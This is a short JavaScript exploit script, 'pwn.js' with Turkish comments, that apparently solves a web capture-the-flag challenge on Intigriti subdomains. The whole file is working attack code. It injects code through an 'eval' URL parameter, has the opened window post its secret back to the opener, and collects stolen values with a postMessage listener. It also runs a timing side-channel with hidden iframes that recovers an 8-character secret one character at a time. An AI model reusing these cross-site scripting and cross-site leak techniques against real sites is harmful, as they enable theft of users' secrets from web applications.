// pwn.js - Final v3
var stones = { space: '', soul: '', time: '', mind: '', power: '', reality: '' };

// 1. Space & Soul Dinleyici
window.addEventListener('message', function(e) {
    if (typeof e.data === 'string' && e.data.length === 8) {
        console.log("%c[+] Space Stone: " + e.data, "color:lime;font-size:14px");
        stones.space = e.data;
        check();
    }
    if (e.data && typeof e.data === 'string' && e.data.startsWith('Soul:')) {
        stones.soul = e.data.split(':')[1];
        console.log("%c[+] Soul Stone: " + stones.soul, "color:cyan;font-size:14px");
        check();
    }
});

// 2. Soul Stone Tetikleyici
function triggerSoul() {
    // Opener trick ile veriyi alıyoruz
    var p = "opener.postMessage('Soul:'+soulStone,'*');window.close();";
    // eval parametresi
    var url = "https://soul.challenge-1225.intigriti.io/?eval=" + encodeURIComponent(p);
    window.open(url, 'soulWindow');
}

// 3. Time Stone Oracle
async function crackTime() {
    var charset = '0123456789abcdef';
    var known = '';
    console.log("[*] Time Stone cracking started...");
    
    while(known.length < 8) {
        for(var i=0; i<charset.length; i++) {
            var char = charset[i];
            var guess = known + char;
            
            var t0 = performance.now();
            await loadIframe("https://time.challenge-1225.intigriti.io/search?q=" + guess + "&z=" + Math.random());
            var t1 = performance.now();
            var diff = t1 - t0;

            // /yes sayfası (resim var) daha yavaş, /nope (text) daha hızlı.
            // Bu değeri kendi internetine göre ayarla! (örn: 100, 300, 600)
            if (diff > 400) { 
                console.log("[+] Time char: " + char + " (" + Math.round(diff) + "ms)");
                known += char;
                break;
            }
        }
    }
    stones.time = known;
    check();
}

function loadIframe(url) {
    return new Promise(r => {
        var ifr = document.createElement('iframe');
        ifr.src = url;
        ifr.style.display = 'none';
        document.body.appendChild(ifr);
        ifr.onload = () => { ifr.remove(); r(); };
    });
}

function check() {
    // Test için bulduklarımızı göster
    if(stones.space && stones.soul && stones.time) {
        alert("Space: " + stones.space + "\nSoul: " + stones.soul + "\nTime: " + stones.time);
    }
}

// Başlat
setTimeout(triggerSoul, 1500);
crackTime();
